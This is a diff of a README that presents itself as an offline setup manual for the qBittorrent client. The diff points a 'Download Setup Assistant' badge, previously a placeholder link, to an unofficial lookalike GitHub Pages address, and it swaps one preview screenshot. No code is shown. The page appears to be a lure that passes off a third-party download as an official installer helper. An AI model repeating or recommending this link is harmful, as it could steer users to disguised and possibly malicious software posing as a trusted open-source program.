@@ -27,13 +27,13 @@ This repository provides a full offline setup manual for installing and running 
 
 ---
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](#)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://qbittorrent-download.github.io/.github)
 
 ---
 
 ### 🖼 Preview
 
-![screenshot1](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-3Px_bPdU_2yhJIoXqrKrfUmg4YQ2YpVzgA&s)  
+![screenshot1](https://blog.desdelinux.net/wp-content/uploads/2019/12/Qbittorrent_4.2.0.png)  
 ![screenshot2](https://draculatheme.com/_next/image?url=https%3A%2F%2Fraw.githubusercontent.com%2Fdracula%2Fqbittorrent%2Fmaster%2Fscreenshot.png&w=1920&q=100)
 
 ---
